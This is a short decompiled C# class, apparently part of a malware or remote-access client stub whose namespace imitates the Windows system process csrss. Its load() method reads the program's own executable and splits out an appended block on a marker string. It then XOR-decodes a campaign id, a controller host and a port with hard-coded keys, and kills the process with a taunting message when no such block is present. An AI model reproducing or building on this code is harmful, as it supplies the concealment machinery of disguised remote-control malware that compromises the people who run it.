using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace MI_CSRSS;

internal class Config
{
	public const string ver = "v1.5";

	public static string id = "usb";

	public static string host = "127.0.0.1";

	public static int port = 20;

	public static void load()
	{
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		string text = File.ReadAllText(Application.get_ExecutablePath());
		if (text.Contains("sdgsdfg$msdfgsdfg/"))
		{
			string[] array = MagicSplit(text, "sdgsdfg$msdfgsdfg/");
			id = XOR.Decode(array[1], "AfkoEjfR45kz4sqlr3");
			host = XOR.Decode(array[2], "fEsGrQd5j8jhDRy9f4");
			port = int.Parse(XOR.Decode(array[3], "gfdhsgfdsg43TREZT4352GgrezT"));
		}
		else
		{
			MessageBox.Show("Are you stupid?", "", (MessageBoxButtons)4, (MessageBoxIcon)0);
			Process.GetCurrentProcess().Kill();
		}
	}

	public static string[] MagicSplit(string source, string expr)
	{
		List<string> list = new List<string>();
		list.Add(source.Substring(0, source.IndexOf(expr)));
		string text = source.Substring(source.IndexOf(expr) + expr.Length);
		while (text.Contains(expr))
		{
			list.Add(text.Substring(0, text.IndexOf(expr)));
			text = text.Substring(text.IndexOf(expr) + expr.Length);
		}
		list.Add(text);
		return list.ToArray();
	}
}
